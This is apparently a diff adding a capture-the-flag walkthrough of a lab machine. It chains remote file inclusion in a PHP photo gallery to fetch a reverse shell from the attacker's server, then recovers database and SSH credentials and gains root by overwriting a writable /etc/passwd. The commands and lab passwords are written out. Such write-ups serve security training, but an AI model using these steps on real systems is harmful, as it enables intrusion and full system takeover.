@@ -179,7 +179,339 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 348.74 seconds
            Raw packets sent: 196877 (8.666MB) | Rcvd: 238 (11.344KB)
 ```
-From our scan we have 8 opened ports. Port 21 which runs ftp, port 22 which runs ssh, port 80 which runs http, port 111 which runs rpcbind
+From our scan we have 8 opened ports. Port 21 which runs ftp, port 22 which runs ssh, port 80 which runs http, port 111 which runs rpcbind, port 139&445 which runs netbios, port 3306 which runs mysql and port 33060 which runs mysqlx. Our enumeration will be focused on port 21 and port 80.
+
+
+
+<h2>Enumeration Port 21</h2>
+
+Since anonymous login is allowed for this ftp server lets try to login with these creds
+
+```username:anonymous```                   ```password:anonymous```
+
+>command: ftp 192.168.53.58
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ ftp 192.168.53.58 
+Connected to 192.168.53.58.
+220 (vsFTPd 3.0.2)
+Name (192.168.53.58:bl4ck4non): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+```
+cool, now we are logged in. Lets check the files available on this ftp server
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ ftp 192.168.53.58
+Connected to 192.168.53.58.
+220 (vsFTPd 3.0.2)
+Name (192.168.53.58:bl4ck4non): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||60864|).
+ftp: Can't connect to `192.168.53.58:60864': Connection timed out
+200 EPRT command successful. Consider using EPSV.
+
+```
+We are getting the "connection timed out" error. Lets move on to the next port
+
+
+
+
+<h2>Enumeration Port 80</h2>
+
+Going to the webpage you should get this
+
+![image](https://user-images.githubusercontent.com/67879936/222937250-b7d1d01e-4c19-4870-88e1-3448c3bbd267.png)
+
+The webpage is running on ```simple php photo gallery v0.8```, lets check online for available exploits
+
+![image](https://user-images.githubusercontent.com/67879936/222937326-8c7d8e81-065b-4df9-a517-1acea36213ad.png)
+
+cool, we found exploits for this CMS. Lets go ahead and exploit this vulnerability.
+
+
+
+
+<h2>Exploitation</h2>
+
+Link to Exploit:https://www.exploit-db.com/exploits/48424
+
+Reading the exploit, I saw the Poc (proof of concept)
+
+![image](https://user-images.githubusercontent.com/67879936/222937717-8e083a9d-0118-454b-8c62-420ab46ebf14.png)
+
+Lets navigate to that url, but to test a possible RFI (Remote File Inclusion), i'll host a file on my webserver and will try to get access it from that url
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ ls
+snookums
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+Link:http://192.168.53.58/image.php?img=http://192.168.49.53/snookums
+
+![image](https://user-images.githubusercontent.com/67879936/222937841-eac8d210-0f79-4bca-8281-0ae1bf0a9bd2.png)
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ ls
+snookums
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.53.58 - - [05/Mar/2023 03:09:04] "GET /snookums HTTP/1.0" 200 -
+```
+cool, now lets go ahead and host our reverse shell so we can get a shell back to our machine. I will be making use of php-pentestmonkey
+
+Link to get php-pentestmonkey rev shell:https://github.com/pentestmonkey/php-reverse-shell
+
+![image](https://user-images.githubusercontent.com/67879936/222937958-59f40b30-54b6-4021-8937-7844629cd63b.png)
+
+set your $ip and also the port you would want to listen on
+
+Also, ensure you set your netcat listener
+
+>command: nc -nvlp 445
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ ls
+shell.php  snookums
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+![image](https://user-images.githubusercontent.com/67879936/222938236-cce086c5-8e34-47a1-9fcf-87fcaa7335ba.png)
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ python3 -m http.server 80  
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.53.58 - - [05/Mar/2023 03:23:48] "GET /shell.php HTTP/1.0" 200 -
+```
+Lets check out netcat listener to see if we captured anything
+
+![image](https://user-images.githubusercontent.com/67879936/222938269-bd4f52c6-8039-49c8-9c73-0d5a20157e3b.png)
+
+cool, we got a shell as user ```apache```. Lets stabilize this shell
+
+```
+python3 -c “import pty;pty.spawn(‘/bin/bash’)”
+ctrl + z (to background)
+stty raw -echo && fg
+export TERM=xterm
+```
+![image](https://user-images.githubusercontent.com/67879936/222938485-76a77df9-9511-4f2b-90af-26222427aaea.png)
+
+Now that we've done that lets go ahead and escalate our privileges
+
+
+
+<h2>Privilege Escalation</h2>
+
+Checking the ```/var/www/html``` directory I found a .db file
+
+![image](https://user-images.githubusercontent.com/67879936/222938935-ace757a1-890b-4c83-9d00-08f2a3ee8522.png)
+
+cool, the .db file contains DB username and password. Lets go ahead and connect to the mysql database
+
+>command: mysql -u root -p
+
+![image](https://user-images.githubusercontent.com/67879936/222939000-d5e53f80-cef2-4949-9304-d4824b05a63a.png)
+
+we are logged in
+
+```
+bash-4.2$ mysmysql -u root -p
+mysql -u root -p
+Enter password: MalapropDoffUtilize1337
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 16
+Server version: 8.0.20 MySQL Community Server - GPL
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| SimplePHPGal       |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.03 sec)
+
+mysql> use SimplePHPGal;
+use SimplePHPGal;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables
+show tables
+    -> ;
+;
++------------------------+
+| Tables_in_SimplePHPGal |
++------------------------+
+| users                  |
++------------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
+select * from users;
++----------+----------------------------------------------+
+| username | password                                     |
++----------+----------------------------------------------+
+| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
+| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
+| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
++----------+----------------------------------------------+
+3 rows in set (0.00 sec)
+
+mysql> 
+```
+We got usernames and passwords, but the user we are concerned with here is ```michael``` so lets go ahead and decode the password encrypted in base64
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ echo "U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==" | base64 --decode
+SG9ja1N5ZG5leUNlcnRpZnkxMjM=                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ echo "SG9ja1N5ZG5leUNlcnRpZnkxMjM=" | base64 --decode
+HockSydneyCertify123                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ 
+ ```
+During our scan we saw port 22 opened, so with the password we found we can try to login to the ssh server as user ```michael```
+
+```username:michael```                ```password:HockSydneyCertify123```
+
+![image](https://user-images.githubusercontent.com/67879936/222939365-fe6995e4-5e88-49fd-bf6b-1cfe3423de3a.png)
+
+cool, lets escalate our privileges further
+
+I ran linpeas and found something interesting
+
+![image](https://user-images.githubusercontent.com/67879936/222939501-479d5931-411b-4c99-aa13-0b38f35a4558.png)
+
+The ```/etc/passwd``` file is writable cool. We'll copy the content of the passwd file to our machine then modify it.
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ gedit passwd           
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ cat passwd                                          
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+chrony:x:998:996::/var/lib/chrony:/sbin/nologin
+michael:x:1000:1000:Michael:/home/michael:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+```
+Lets generate a password using openssl      
+
+>command: openssl passwd 1234567890
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ openssl passwd 1234567890
+$1$jKxj2MJv$qfMmM3mHFTgVv.2t27Rl4.
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ 
+```
+We'll add this hashed password to the passwd file we created
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ gedit passwd
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
+└─$ cat passwd
+root:$1$jKxj2MJv$qfMmM3mHFTgVv.2t27Rl4.:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+chrony:x:998:996::/var/lib/chrony:/sbin/nologin
+michael:x:1000:1000:Michael:/home/michael:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+```
+observe I replaced the ```x``` from the root user to the hashed password. Now, lets send this file to the target's machine so it can overwrite the previous passwd file
+
+![image](https://user-images.githubusercontent.com/67879936/222939908-8f0fdc33-96d1-4a65-affb-a288a38b0d2d.png)
+
+it worked, now lets switch user to root user then provide the password we hashed using openssl, in my case the password was ```1234567890```.
+
+![image](https://user-images.githubusercontent.com/67879936/222939950-4ace5808-5605-4235-9e35-156e1bcbf4ce.png)
+
+Boom!!! We got shell as the root user.
+
+That will be all for today
+<br> <br>
+[Back To Home](../../index.md)
 
 
 
